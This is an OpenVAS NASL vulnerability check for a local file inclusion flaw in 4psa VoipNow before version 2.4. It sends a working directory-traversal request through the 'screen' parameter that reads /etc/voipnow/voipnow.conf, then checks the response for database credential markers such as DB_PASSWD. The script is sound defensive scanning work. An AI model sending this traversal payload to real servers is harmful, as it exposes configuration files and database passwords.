###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_4psa_voipnow_lfi_vuln.nasl 6065 2017-05-04 09:03:08Z teissa $
#
# 4psa Voipnow Local File Inclusion Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803195");
  script_version("$Revision: 6065 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-05-04 11:03:08 +0200 (Thu, 04 May 2017) $");
  script_tag(name:"creation_date", value:"2013-04-22 18:28:32 +0530 (Mon, 22 Apr 2013)");
  script_name("4psa Voipnow Local File Inclusion Vulnerability");

  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/121374");
  script_xref(name : "URL" , value : "http://bot24.blogspot.in/2013/04/voipnow-24-local-file-inclusion.html");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 443);
  script_dependencies("find_service.nasl", "http_version.nasl");

  script_tag(name : "impact" , value : "Successful exploitation will allow an attacker to view files and execute
  local scripts in the context of the application.
  Impact Level: Application");
  script_tag(name : "affected" , value : "4psa voipnow version prior to 2.4");
  script_tag(name : "insight" , value : "The flaw is due to an improper validation of user-supplied input to
  the 'screen' parameter in '/help/index.php?', which allows attackers
  to read arbitrary files via a ../(dot dot) sequences.");
  script_tag(name : "solution" , value : "Upgrade to 4psa voipnow 2.4 or later,
  For updates refer to http://www.4psa.com/products-voipnow-spe.html");
  script_tag(name : "summary" , value : "This host is running 4psa Voipnow and is prone to local file
  inclusion vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = "";
req = "";
res = "";
host = "";

## Get HTTP Port
port = get_http_port(default:443);

## Get Host name
host = http_host_name(port);

res = http_get_cache(item:"/", port:port);

## Confirm the application before trying the exploit
if("VOIPNOW=" >< res && "Server: voipnow" >< res)
{
  url = '/help/index.php?screen=../../../../../../../../etc/voipnow/voipnow.conf';
  req = string("GET ", url," HTTP/1.1\r\n",
               "Host: ", host, "\r\n");

  res = http_keepalive_send_recv(port:port, data:req);

  ## Confirm the exploit
  if("VOIPNOWCALLAPID_RC_D" >< res && "VOIPNOW_ROOT_D" >< res &&
     'Database location' >< res && "DB_PASSWD" >< res)
  {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
